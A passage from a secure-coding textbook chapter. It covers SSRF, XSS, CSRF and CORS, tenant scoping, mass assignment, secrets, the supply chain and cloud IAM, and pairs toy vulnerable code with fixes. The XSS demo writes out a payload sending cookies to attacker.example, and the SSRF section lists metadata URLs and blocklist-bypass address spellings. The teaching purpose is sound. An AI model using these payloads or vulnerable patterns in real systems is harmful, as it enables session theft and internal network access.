import sqlite3 db = sqlite3.connect(":memory:") db.executescript("""CREATE TABLE docs(id INTEGER PRIMARY KEY, tenant TEXT, title TEXT); INSERT INTO docs VALUES (1,'acme','acme roadmap'),(2,'acme','acme salaries'),(3,'globex','globex plan');""") def get_doc_vulnerable(doc_id): return db.execute("SELECT title FROM docs WHERE id = ?", (doc_id,)).fetchone() class TenantDocs: """Every method adds the tenant filter itself; callers cannot skip it.""" def __init__(self, tenant): self.tenant = tenant def get(self, doc_id): return db.execute("SELECT title FROM docs WHERE id = ? AND tenant = ?", (doc_id, self.tenant)).fetchone() def list(self): return [r[0] for r in db.execute("SELECT title FROM docs WHERE tenant = ? ORDER BY id", (self.tenant,))] print("vulnerable, acme user asks for #3:", get_doc_vulnerable(3)) acme = TenantDocs("acme") print("scoped, acme user asks for #3 :", acme.get(3)) print("scoped list :", acme.list())
vulnerable, acme user asks for #3: ('globex plan',) scoped, acme user asks for #3 : None scoped list : ['acme roadmap', 'acme salaries']

The pattern is to make the safe path the only path. The tenant comes from the authenticated session, never from a request field the client can change. Databases such as PostgreSQL also offer row-level security, which enforces the filter inside the database itself, so even a query you forgot to filter returns only the caller's rows. Belt and braces: application scoping plus database policy, plus a test that logs in as tenant A and tries every id of tenant B.

Mass assignment: the fields you did not mean to expose

The last authorization trap looks harmless. A profile-update endpoint takes the JSON body and copies it onto the user record: user.update(body). The developer expected {"name": "Asha B."}. The attacker sends {"name": "Asha B.", "role": "admin"}. This is mass assignment, or in API terms broken object property level authorization. It happens because frameworks make it easy to bind a whole request onto an object.

Mass assignment and the allowlist fix
def update_vulnerable(user, body): user.update(body) return user EDITABLE = {"name", "phone"} def update_safe(user, body): unknown = set(body) - EDITABLE if unknown: raise ValueError(f"fields not allowed: {sorted(unknown)}") user.update(body) return user attack = {"name": "Asha B.", "role": "admin"} print("vulnerable:", update_vulnerable({"name": "Asha", "role": "customer"}, attack)) try: update_safe({"name": "Asha", "role": "customer"}, attack) except ValueError as e: print("ValueError:", e) print("safe, honest:", update_safe({"name": "Asha", "role": "customer"}, {"phone": "555-0100"}))
vulnerable: {'name': 'Asha B.', 'role': 'admin'} ValueError: fields not allowed: ['role'] safe, honest: {'name': 'Asha', 'role': 'customer', 'phone': '555-0100'}

The allowlist names the editable fields explicitly. New fields added to the record next year stay protected by default, because nothing lists them. The same applies in reverse for responses: return an explicit list of fields, so a new internal column such as password_hash never leaks by accident.

Test authorization like a matrix

Authorization bugs hide in combinations. A table-driven test loops over every user and every resource and compares the result with an expectation written by a human. It is boring and effective.

A user x resource permission matrix

Check yourself: Why should the tenant id come from the session rather than from a request parameter?
Anything in the request can be edited by the caller. A tenant id from the authenticated session is set by the server after login and cannot be changed by the client.
Check yourself: Why is an allowlist safer than a blocklist for mass assignment?
A blocklist must name every dangerous field forever and fails when a new one is added. An allowlist protects new fields by default.

Recap
  • ABAC decides from attributes of user, resource and context; keep the policy in one function and test its boundaries.

3.12 — Server-Side Request Forgery (SSRF)

Corner Shop adds a feature: "Import a product photo from a web address". The user types a URL, and the server downloads the image. The attacker asks a sharp question: whose network position is the server in? Your server sits inside your private network. It can reach the database, an admin panel that has no password because "only staff can reach it", and, on cloud machines, a special local address that hands out credentials. Users cannot reach those. The server can. If the attacker can choose the URL, they borrow the server's position. This is SSRF: server-side request forgery.

SSRF: the server fetches on the attacker's behalf
   attacker --- "import photo from http://169.254.169.254/..." ---> [ shop server ]
                                                                        |  (inside our network)
   internet users cannot reach these:                                   v
                                    [ cloud metadata service ]  <-------+   returns access keys
                                    [ internal admin panel   ]  <-------+
                                    [ database admin port    ]  <-------+
   the firewall trusted "requests from the shop server"; the server trusted "any URL the user typed"

The special address 169.254.169.254 is used by major cloud providers as a "metadata service": a machine can ask it who it is and get temporary keys. It is only reachable from the machine itself. That makes it the classic SSRF target, and several well-known breaches began exactly here. Our demo replaces the network with a dictionary, so nothing is really contacted.

The vulnerable importer

A fetcher that trusts any URL
FAKE_NETWORK = { "http://images.example/cat.png": "<bytes of a cat photo>", "http://169.254.169.254/latest/meta-data/iam/": "TOY-ACCESS-KEY=AKIA-EXAMPLE-ONLY", "http://internal-admin.local/users": "admin panel: 3 users, export button", } def fetch_vulnerable(url): return FAKE_NETWORK.get(url, "connection failed") for url in ["http://images.example/cat.png", "http://169.254.169.254/latest/meta-data/iam/", "http://internal-admin.local/users"]: print(url, "->", fetch_vulnerable(url))
http://images.example/cat.png -> <bytes of a cat photo> http://169.254.169.254/latest/meta-data/iam/ -> TOY-ACCESS-KEY=AKIA-EXAMPLE-ONLY http://internal-admin.local/users -> admin panel: 3 users, export button

The importer treats all three the same. The second and third answers never should have left the building. Let us look at the fixes attackers defeat first, because they teach what not to do.

The blocklist that fails

The first idea is to block the bad addresses: refuse URLs that contain localhost or 127.0.0.1. Attackers have many other spellings for the same place. An IPv4 address is only a 32-bit number, and operating systems accept it in decimal, hex, octal, or shortened forms. The standard library can show that these strange spellings all mean the loopback address, without touching any network.

Five spellings of one address
import socket, ipaddress def blocked_by_blocklist(url): return "localhost" in url or "127.0.0.1" in url spellings = ["http://127.0.0.1/", "http://2130706433/", "http://0x7f.0.0.1/", "http://127.1/", "http://LOCALHOST/"] for u in spellings: host = u.split("/")[2] try: ip = socket.inet_ntoa(socket.inet_aton(host)) except OSError: ip = "(a name, resolved later)" print(f"{u:22} blocklist stops it: {blocked_by_blocklist(u)!s:5} real address: {ip}") print("is 127.1 loopback?", ipaddress.ip_address("127.0.0.1").is_loopback)

Only the first spelling is caught by the blocklist. The other four still reach the same machine (the last only slips through because the check was case-sensitive). The lesson repeats Section 3.3: do not try to list what is bad. Decide what is good, and check the resolved address, not the text.

The fix: parse, allow, resolve, verify, pin

A sound defence has layers. Parse the URL with a real parser, not string searching. Allow only the scheme (https) and, ideally, a list of permitted hosts. Resolve the host name to an IP address yourself. Verify the address is public: not private, loopback or link-local. Finally pin the connection to the address you checked, because a hostile DNS server can answer with a public address for your check and a private one a moment later (DNS rebinding). Also re-run all of this on every redirect, since a harmless URL can redirect to a harmful one.

A validator with a toy DNS table
import ipaddress from urllib.parse import urlsplit DNS = {"images.example": "93.184.216.34", "evil.example": "10.0.0.5", "metadata.evil": "169.254.169.254"} def safe_target(url): parts = urlsplit(url) if parts.scheme != "https": return None, "scheme must be https" if parts.username or parts.password: return None, "credentials in URL not allowed" ip_text = DNS.get(parts.hostname) # we resolve, once if ip_text is None: return None, "cannot resolve" ip = ipaddress.ip_address(ip_text) if not ip.is_global: # private, loopback, link-local, reserved return None, f"address {ip} is not public" return ip_text, "ok" # connect to THIS ip, not the name again for u in ["https://images.example/cat.png", "http://images.example/cat.png", "https://evil.example/x", "https://metadata.evil/latest", "https://images.example@evil.example/"]: print(f"{u:40} -> {safe_target(u)}")
https://images.example/cat.png -> ('93.184.216.34', 'ok') http://images.example/cat.png -> (None, 'scheme must be https') https://evil.example/x -> (None, 'address 10.0.0.5 is not public') https://metadata.evil/latest -> (None, 'address 169.254.169.254 is not public') https://images.example@evil.example/ -> (None, 'credentials in URL not allowed')

What Python does, line by line

  • urlsplit cuts the URL into scheme, host, path and so on, so we inspect the host directly instead of searching text.
  • Non-HTTPS schemes are refused (this also removes file: and gopher: tricks). A URL with a user-info part is refused: in https://images.example@evil.example/ the real host is evil.example, a favourite disguise.
  • The host is resolved once. is_global is false for private ranges, loopback, and link-local addresses such as the metadata address.
  • The function returns the checked IP so the caller connects to exactly that address, closing the rebinding gap.

Common mistake: trusting the redirect

Even a perfect check on the first URL fails if the client silently follows a redirect to a private address. Treat every hop as a new, untrusted URL.

Re-validate after every redirect
REDIRECTS = {"https://short.example/a": "https://images.example/cat.png", "https://short.example/b": "https://metadata.evil/latest"} DNS = {"short.example": "93.184.216.35", "images.example": "93.184.216.34", "metadata.evil": "169.254.169.254"} import ipaddress from urllib.parse import urlsplit def public(url): ip = DNS.get(urlsplit(url).hostname) return ip is not None and ipaddress.ip_address(ip).is_global def fetch_following(url, max_hops=3): for hop in range(max_hops): if not public(url): return f"blocked at hop {hop}: {url}" if url not in REDIRECTS: return f"fetched {url}" url = REDIRECTS[url] return "too many redirects" print(fetch_following("https://short.example/a")) print(fetch_following("https://short.example/b"))
fetched https://images.example/cat.png blocked at hop 1: https://metadata.evil/latest

Beyond code, defend the network too: run fetchers in a separate, locked-down network zone; require the newer, session-based cloud metadata service (IMDSv2 on AWS) that refuses simple forwarded requests; and give the machine only the minimum cloud permissions (Section 3.16), so a leak of its keys gives an attacker little.

Check yourself: Why check the resolved IP address instead of the host name?
Names can point anywhere: an attacker registers evil.example with an internal address. The IP is what the connection really goes to.
Check yourself: What does "pinning" the connection defend against?
DNS rebinding: a name that answers with a public address at check time and a private one at connect time. Connecting to the address you already verified removes the second lookup.

  • SSRF makes your server fetch a URL the attacker chose, borrowing its privileged network position.

3.13 — XSS, CSRF and CORS: Attacks Through the Browser

So far the attacker has talked to our server. Three classic attacks work differently: they use Asha's browser as the weapon. The browser holds Asha's cookies, runs whatever scripts a page contains, and helpfully attaches credentials to requests. The attacker's goal is to get the browser to run their code or send their request. Each of the three attacks abuses a different rule of the browser, so keep them apart in your head.

AttackWhat the attacker gets the browser to doRule abusedMain defences
XSS (cross-site scripting)Run attacker's script inside our sitePage content is trusted as codeOutput encoding, CSP, HttpOnly cookies
CSRF (cross-site request forgery)Send a state-changing request from another siteCookies are attached automaticallySameSite cookies, anti-forgery tokens

XSS: our page, their script

Corner Shop shows product reviews. A review is text a visitor typed. If the server pastes it into HTML unchanged, a visitor can type <script>...</script> instead of an opinion, and every later visitor's browser runs it. That script executes with the site's full trust: it can read anything the page can, call our API as the victim, and send data to an attacker. This is the same mistake as SQL injection in another language: data pasted into code. The remedy has the same shape: encode on output for the place the data lands.

A review page that pastes text into HTML, and the fix
import html def render_vulnerable(author, text): return f"<p><b>{author}</b>: {text}</p>" def render_safe(author, text): return f"<p><b>{html.escape(author)}</b>: {html.escape(text)}</p>" review = "<script>fetch('https://attacker.example/steal?c=' + document.cookie)</script>" print("vulnerable:", render_vulnerable("mallory", review)) print("safe :", render_safe("mallory", review)) print("honest :", render_safe("Asha", "Great tea & fast delivery!"))
vulnerable: <p><b>mallory</b>: <script>fetch('https://attacker.example/steal?c=' + document.cookie)</script></p> safe : <p><b>mallory</b>: &lt;script&gt;fetch(&#x27;https://attacker.example/steal?c=&#x27; + document.cookie)&lt;/script&gt;</p> honest : <p><b>Asha</b>: Great tea &amp; fast delivery!</p>

The escaped output turns < into &lt;, so the browser displays the text instead of running it. Notice the honest review: the ampersand is encoded too, and displays correctly. Nothing is lost.

"Encode for the place the data lands" matters because HTML text, HTML attributes, URLs and JavaScript each have different special characters. Two more contexts trip people up. In an attribute, an unquoted or unescaped quote lets the attacker add their own attributes, such as onmouseover. In a URL, a value like javascript:steal() runs code when clicked, so links from users must be checked against an allowed scheme list.

Attribute and URL contexts
import html from urllib.parse import urlsplit def link_vulnerable(url, label): return f'<a href="{url}">{label}</a>' def link_safe(url, label): if urlsplit(url).scheme not in ("http", "https"): url = "#" # refuse javascript:, data:, etc. return f'<a href="{html.escape(url, quote=True)}">{html.escape(label)}</a>' attacks = ['javascript:alert(1)', 'https://x.example/" onmouseover="alert(1)'] for a in attacks: print("vulnerable:", link_vulnerable(a, "my site")) print("safe :", link_safe(a, "my site"))

Template engines such as Jinja2 escape by default, and modern front-end frameworks do too. The dangerous moments are the escape hatches: |safe, innerHTML, dangerouslySetInnerHTML. Grep for them in review. As a second layer, a Content Security Policy header tells the browser which script sources to run, so an injected inline script is refused even if encoding failed. And HttpOnly cookies (Section 3.7) mean a successful script still cannot read the session id.

CSRF: their request, our cookie

Asha is logged in to Corner Shop. In another tab she opens an attacker's page containing a hidden form that posts to shop.example/transfer. Browsers attach cookies to requests for a site no matter which page triggered the request, so the shop sees a valid session cookie and processes the transfer. The attacker never sees the response and does not need to: the damage is the side effect. The model below plays the browser's cookie rule and the two classic defences.

A forged transfer, then SameSite and a CSRF token

In the second row the 401 means the browser never attached the cookie, so the forged request arrived as an anonymous one. Three defences appear. SameSite=Lax stops the browser attaching the cookie to cross-site POSTs, and is now the default in modern browsers, but do not rely on defaults alone. An anti-forgery token is a secret value tied to the session that the real form includes and the attacker cannot know; the server compares it. Sensitive actions may also demand re-entering the password. APIs that authenticate with an Authorization header (not a cookie) are not CSRF-prone, because the browser does not attach that header by itself.

Common mistake: comparing tokens with the wrong type

A real error from compare_digest
import hmac try: hmac.compare_digest("café", "cafe") except TypeError as e: print("TypeError:", e) print(hmac.compare_digest("café".encode(), "cafe".encode()))

When both arguments are strings they must be plain ASCII. Encode to bytes first, as the last line does, whenever a token could contain other characters.

CORS: who may read our responses

Browsers enforce the same-origin policy: a script on evil.example may send requests to shop.example but may not read the response. An origin is scheme plus host plus port. CORS (cross-origin resource sharing) is how a server deliberately relaxes that rule by sending headers such as Access-Control-Allow-Origin. It is a permission you grant to browsers, not a protection against attackers, and it is one of the most misconfigured features in the web. The classic error: copy the request's Origin header into the answer and also allow credentials. Then any website can read Asha's private data using her cookies.

Reflected origins versus an exact allowlist

Only the allowlist gives the right answer for every row. The suffix check is the sneaky one: evilshop.example ends with shop.example and so passes. Compare whole origins with exact equality, add Vary: Origin so caches do not mix answers, and remember that * may not be combined with credentials (browsers refuse it). If an endpoint is public data with no cookies, * is fine.

3.14 — Secrets Management: Keys, Vaults, Rotation and Leaks in Git

A secret is any value that grants access: a database password, an API key, a signing key, a private certificate. The attacker's view is a treasure hunt. They do not break your login form if they can find the key that skips it. Where do secrets leak? Source code committed to a repository, container images, chat messages, log files, build output, laptops, and old backups. Public code hosting is scanned by bots around the clock, and a key pushed to a public repository is typically found in minutes, not days.

The core rule is short: secrets do not live in code. Code is copied, reviewed, emailed and cloned onto many machines, so every developer would hold the production key. Instead, code reads its secrets at run time from the environment that runs it. That gives you separate secrets per environment, access you can grant and remove without a code change, and one place to rotate.

Where a secret should and should not live
   BAD                                     BETTER                              BEST
   in the source file                      environment variable                secrets manager / vault
   in git history                          injected at deploy time             app fetches short-lived secret
   in a Docker image layer                 not printed, not logged             access is audited per read
   in a chat message or ticket             different per environment           automatic rotation
   -------------------------------------------------------------------------------------------->
                                           more control, more moving parts

Attack: the secret already in the repository

Before reading any further, ask: could you find a secret in your own code with a ten-line script? Attackers use exactly that idea. Two tricks find most secrets. Known formats: many providers prefix their keys (for example AKIA for a well-known cloud key, or -----BEGIN PRIVATE KEY-----). High entropy: random-looking strings have many different characters, and Shannon entropy measures that in bits per character. English words score low; random keys score high. All keys below are made up for teaching.

A mini secret scanner: formats and entropy
import math, re from collections import Counter def entropy(text): counts = Counter(text) return -sum(c / len(text) * math.log2(c / len(text)) for c in counts.values()) PATTERNS = {"cloud key id": r"AKIA[0-9A-Z]{16}", "private key": r"-----BEGIN [A-Z ]*PRIVATE KEY-----"} DIFF = """\ +DB_HOST = "db.internal" +API_TOKEN = "Zk9rQ2xw8VtN3mYb7HdE5uXa1sLc4GfJ" +AWS_KEY = "AKIAEXAMPLEEXAMPLE12" +greeting = "hello there and welcome" """ for n, line in enumerate(DIFF.splitlines(), 1): hits = [name for name, pat in PATTERNS.items() if re.search(pat, line)] m = re.search(r'"([^"]{16,})"', line) if m and entropy(m.group(1)) > 4.0: hits.append(f"high entropy ({entropy(m.group(1)):.1f} bits/char)") print(f"line {n}:", hits or "clean")
line 1: clean line 2: ['high entropy (5.0 bits/char)'] line 3: ['cloud key id'] line 4: clean

What Python does, line by line

  • entropy counts how often each character appears and turns the frequencies into bits per character. Repeated letters give a low number; varied characters give a high one.
  • PATTERNS lists formats that are recognisable by their shape.
  • For each added line the scanner tests each pattern, then looks for any quoted string of 16 or more characters and checks its entropy.
  • Line 1 is a plain host name, line 4 is ordinary English, and both are clean. Lines 2 and 3 are flagged. Real scanners such as gitleaks and trufflehog use hundreds of patterns and run in CI and pre-commit hooks.

Reading secrets from the environment, failing fast

An environment variable is a named value the operating system hands to a program when it starts. In production a deploy tool or vault agent sets it. The program reads it once at start-up and stops immediately if it is missing, which is called failing fast: a clear error at boot is far better than a mysterious failure at the first payment. The snippet sets a variable itself only because our browser demo has no deploy tool.

A secrets manager (HashiCorp Vault, a cloud provider's secret store, Kubernetes secrets with encryption at rest) adds access control, audit logs and short-lived credentials.

Rotation without downtime

Rotation means replacing a secret regularly, and immediately after any suspicion of leak. Rotation fails in practice when it needs a big-bang switch: change the key and everything using the old one breaks. The fix is an overlap window: the system signs with the newest key but accepts any key still marked active. Clients migrate, then the old key is retired.

A key ring with an overlap window
import hashlib, hmac keys = {"k1": b"old-secret", "k2": b"new-secret"} active = ["k1", "k2"] # both accepted during the overlap window signing_key_id = "k2" # new tokens always use the newest key def sign(msg): return signing_key_id, hmac.new(keys[signing_key_id], msg, hashlib.sha256).hexdigest() def verify(kid, msg, sig): if kid not in active: return "rejected: key retired" return "ok" if hmac.compare_digest(hmac.new(keys[kid], msg, hashlib.sha256).hexdigest(), sig) else "rejected: bad signature" old_kid, old_sig = "k1", hmac.new(keys["k1"], b"order-7", hashlib.sha256).hexdigest() new_kid, new_sig = sign(b"order-7") print("during overlap : old token", verify(old_kid, b"order-7", old_sig), "| new token", verify(new_kid, b"order-7", new_sig)) active.remove("k1") # window over: retire the old key print("after retirement: old token", verify(old_kid, b"order-7", old_sig), "| new token", verify(new_kid, b"order-7", new_sig))
during overlap : old token ok | new token ok after retirement: old token rejected: key retired | new token ok

3.15 — Dependencies and the Supply Chain

Corner Shop's own code is a few thousand lines. The code it runs is millions: the web framework, the database driver, their dependencies, and their dependencies. Every line came from somebody you have never met. The attacker's view: why break into one well-defended shop when you can slip something into a package that a thousand shops install automatically? This is supply chain risk, and it is why "Vulnerable and outdated components" and "Software integrity failures" appear in the OWASP list.

The software supply chain and where it is attacked
   author --> source repo --> build system --> package registry --> your install --> production
     |            |               |                 |                    |              |
   stolen      malicious       poisoned        typosquat,           unpinned       vulnerable
   account     commit          build step      dependency           "latest"       version
                                               confusion            surprise       never updated
   defences:  MFA, review  | signed builds, |  pinned + hashed  | SBOM + scanning | patch cadence

Four families of problem matter in practice. Known vulnerabilities: a dependency has a published flaw and you have not upgraded. Malicious packages: someone publishes a package built to steal. Unpinned versions: a build silently picks up a new, possibly compromised version. Dependency confusion: your build asks a public registry for a name that is really your private package. We take them in turn, with toy registries.

Pinning: know exactly what you install

A pin fixes an exact version, such as requests==2.31.0. A range such as requests>=2 or a bare name lets the installer choose whatever is newest today, so two builds of the same commit can differ. Pinning gives reproducible builds, and it turns "an update arrived" into a change you review. A lockfile extends the idea to the whole tree, including dependencies of dependencies. Pinning has a cost: you must upgrade on purpose, which is why automated pull requests (Dependabot, Renovate) are a good partner.

Audit a requirements file for unpinned lines
import re REQS = """\ flask==3.0.2 requests>=2.0 numpy pandas==2.2.0 # data # a comment git+https://example.invalid/tools.git """ def classify(line): line = line.split("#")[0].strip() if not line: return None if "==" in line and not line.startswith(("git+", "http")): return "pinned" if line.startswith(("git+", "http")): return "url (unverifiable)" if re.search(r"[<>~]", line): return "range" return "unpinned" for line in REQS.splitlines(): kind = classify(line) if kind: print(f"{line.split('#')[0].strip():40} {kind}")

Hashes: detect a swapped file

A pin says which version. A hash says which exact bytes. If an attacker replaces the file on a mirror, or a registry is compromised, the version number can stay identical while the content changes. Installing with hashes (pip install --require-hashes) makes the installer compute the SHA-256 of what it downloaded and refuse a mismatch. Our toy download is a bytes object.

Typosquatting and dependency confusion

Typosquatting is registering a name one keystroke away from a popular package, such as reqeusts, and waiting for a tired developer. A cheap defence is a check in CI that flags any new dependency whose name is suspiciously similar to a well-known one. Dependency confusion is different: your company has a private package shop-utils, and an attacker publishes shop-utils on the public registry with version 99. An installer that searches both registries and takes the highest version picks the attacker's.

Similar names, and a resolver fooled by version 99
import difflib POPULAR = ["requests", "numpy", "pandas", "flask", "django", "cryptography"] def suspicious(name): if name in POPULAR: return None best = max(POPULAR, key=lambda p: difflib.SequenceMatcher(None, name, p).ratio()) score = difflib.SequenceMatcher(None, name, best).ratio() return f"looks like {best} ({score:.2f})" if score >= 0.8 else None for n in ["requests", "reqeusts", "nunpy", "flask-login-helper", "cryptograpy"]: print(f"{n:22}", suspicious(n) or "ok") private = {"shop-utils": (1, 4)} public = {"shop-utils": (99, 0)} # planted by the attacker naive = max([private["shop-utils"], public["shop-utils"]]) print("naive resolver picks version", naive, "<- attacker's") print("pinned to private index picks", private["shop-utils"])

The fix for confusion is structural: configure the installer to fetch your private names only from the private index, or claim the names on the public registry yourself, and pin hashes so an unexpected file fails. Also prefer few, well-maintained dependencies. Every dependency is trust you extend.

SBOM: an inventory you can search in a hurry

When a famous library flaw appears in the news, the first question is: do we use it, and where? A software bill of materials (SBOM) answers that. It is a machine-readable list of every component and version in a build, in a standard format such as CycloneDX or SPDX. With an SBOM and an advisory database (a list of known-bad version ranges), checking exposure becomes a loop instead of a week of archaeology.

3.16 — Containers, Kubernetes and Cloud IAM: Least Privilege

Sooner or later, some part of your system will be compromised: a dependency flaw, a leaked key, an SSRF bug from Section 3.12. Security engineers plan for that moment with a principle older than computers: least privilege. Every process, container and person gets exactly the access needed for the job, nothing more. Then a compromise of one piece stays small. The size of that damage is called the blast radius, and shrinking it is often worth more than preventing every individual bug.

Blast radius: the same stolen credential, two designs
   WIDE                                        NARROW
   web container runs as root                  web container: non-root, read-only disk
   role: s3:* on *  +  admin on database       role: s3:GetObject on shop-images/* only
   attacker gets shell or key                  attacker gets shell or key
        |                                           |
        v                                           v
   read every bucket, drop the database        read public product images. That is all.

Containers: the safe defaults

A container packages a program with what it needs to run, isolated from other programs on the same machine by the operating system. Isolation is helpful but not perfect: a container running as root with extra capabilities is far closer to owning the host than one running as an ordinary user with everything dropped. Four habits cover most of it. Run as a non-root user. Use a small, pinned base image (fewer packages, fewer flaws; pin by digest to defeat tag swapping). Never bake secrets into image layers, because layers are kept forever. Use a read-only filesystem with explicit writable spots.

A vulnerable and a hardened Dockerfile (reference only)reference only
# --- vulnerable --- FROM python:latest # moving target, large, unknown contents COPY . /app ENV API_KEY=sk-live-abc123 # secret baked into a layer forever RUN pip install -r /app/requirements.txt # no hashes CMD ["python", "/app/server.py"] # runs as root # --- hardened --- FROM python:3.12-slim@sha256:<digest> # small, pinned by content digest RUN useradd --system --no-create-home app COPY --chown=app:app requirements.txt /app/ RUN pip install --no-cache-dir --require-hashes -r /app/requirements.txt COPY --chown=app:app . /app USER app # not root CMD ["python", "/app/server.py"] # secrets arrive at run time, not in the image

Cloud IAM: the policy is the perimeter

In the cloud, IAM (identity and access management) decides what each identity may do. A policy is a list of statements: an effect (Allow or Deny), the actions it covers, and the resources. Three rules govern evaluation in the major clouds, and you should know them cold. Everything is denied by default. An explicit Deny always wins over any Allow. Otherwise an Allow must match both action and resource. The evaluator below reproduces those rules with wildcard matching, then shows what the stolen credential from an SSRF bug could do under a wide policy versus a narrow one.

A small IAM evaluator: default deny, explicit deny wins
from fnmatch import fnmatch def allowed(policy, action, resource): verdict = False for st in policy: if any(fnmatch(action, a) for a in st["actions"]) and any(fnmatch(resource, r) for r in st["resources"]): if st["effect"] == "Deny": return False # explicit deny wins immediately verdict = True return verdict # False (default deny) if nothing matched wide = [{"effect": "Allow", "actions": ["s3:*"], "resources": ["*"]}] narrow = [{"effect": "Allow", "actions": ["s3:GetObject"], "resources": ["shop-images/*"]}] with_deny = wide + [{"effect": "Deny", "actions": ["s3:*"], "resources": ["shop-secrets/*"]}] tests = [("s3:GetObject", "shop-images/cat.png"), ("s3:GetObject", "shop-secrets/keys.txt"), ("s3:DeleteObject", "shop-images/cat.png")] for name, pol in [("wide", wide), ("narrow", narrow), ("wide+deny", with_deny)]: print(f"{name:10}", [allowed(pol, a, r) for a, r in tests])

Read the three rows. wide lets a stolen key read the secrets bucket and delete objects. narrow allows exactly the one job and nothing else. wide+deny shows that a deny guardrail limits a wide policy, but it is a patch: the durable fix is to write the narrow allow in the first place. Practical advice for real IAM: start from nothing and add permissions until the job works, rather than starting from admin and trying to subtract. Prefer short-lived credentials from a role over long-lived keys. Give each service its own identity so one leak does not equal every leak.   • Linters catch the mechanical mistakes; review catches the design ones.

Question 1 of 5
A junior developer "fixes" a SQL injection by stripping every apostrophe out of user input before still building the query with an f-string. Is this a reliable fix?
Why: Filtering chases spellings: a numeric field needs no quote at all, and comments or encodings offer other routes in. Parameterized queries remove the whole class by sending code and data on separate channels, which is why section 3.3 treats escaping as a weak fix.
Question 2 of 5
An attacker steals your password table and rents a GPU farm to guess passwords offline. Which storage method actually slows them down?
Why: A salt only stops shared rainbow tables and duplicate detection; SHA-256 is still fast, so a per-user wordlist attack is quick either way. A slow hash multiplies the attacker's cost by hundreds of thousands. Reversible encryption is worse than either: whoever holds the key can read every password at once.
Question 3 of 5
A JWT verifier reads the "alg" field out of the token's own header and uses whatever it says to check the signature. An attacker sets alg to "none" and leaves the signature blank. What should a correctly written verifier do?
Why: The attacker controls every byte of the header, including "alg". A verifier that obeys it is letting the token pick its own rules. Pin an allowlist such as {"HS256"} in code and reject anything else before ever touching the signature — this is exactly the alg=none attack from section 3.8.
Question 4 of 5
Asha is properly logged in. /invoices/17 shows her own invoice; typing /invoices/18 in the address bar shows Chen's invoice instead. What check is missing?
Why: This is IDOR/BOLA (section 3.10): authentication confirmed who Asha is, but nothing confirmed she owns invoice 18. HTTPS, password strength and CAPTCHAs do not touch this gap. The fix is an ownership check inside the object lookup itself, returning the same 404 whether the id belongs to someone else or does not exist.
Question 5 of 5
A developer commits an API key, notices right away, and deletes the line in the very next commit. HEAD is now clean. What is the correct first step?
Why: Version control keeps every past version, and public repositories are scanned by bots within minutes. Deleting the line or rewriting history is cosmetic if the key still works. Revoking and rotating first is the only step that actually closes the hole (section 3.14).
